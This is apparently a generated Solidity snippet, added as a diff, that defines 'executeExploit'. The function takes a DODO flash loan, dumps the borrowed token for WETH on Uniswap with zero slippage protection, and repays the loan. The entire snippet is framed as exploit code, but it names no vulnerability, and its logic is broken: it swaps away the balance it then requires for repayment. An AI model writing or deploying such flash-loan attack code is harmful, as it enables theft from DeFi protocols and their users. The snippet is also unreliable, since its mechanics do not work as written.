@@ -1,0 +1,40 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start the flash loan process
+    // Use the provided amount in the flashloan
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "");
+
+    // The amount of valuableToken we received from the flash loan
+    uint256 valuableAmount = valuableToken.balanceOf(address(this));
+
+    // Obtain Uniswap pair and find reserves
+    setUniswapPair(address(valuableToken)); // Set the Uniswap pair for valuableToken
+
+    // Execute token swap if needed
+    swapTokensForWETH(valuableAmount);
+
+    // Ensure we have enough valuable tokens to repay the flash loan
+    require(valuableToken.balanceOf(address(this)) >= amount, "Insufficient funds after exploit");
+    
+    // Repay the flash loan
+    valuableToken.transfer(flashloanProvider, amount);
+}
+
+// Function to swap valuable tokens for WETH
+function swapTokensForWETH(uint256 amount) internal {
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+
+    // Perform the swap
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount,
+        0, // Set minimum output to 0 for this exploit
+        path,
+        address(this),
+        block.timestamp
+    );
+}
+</executeExploitCode>
+```
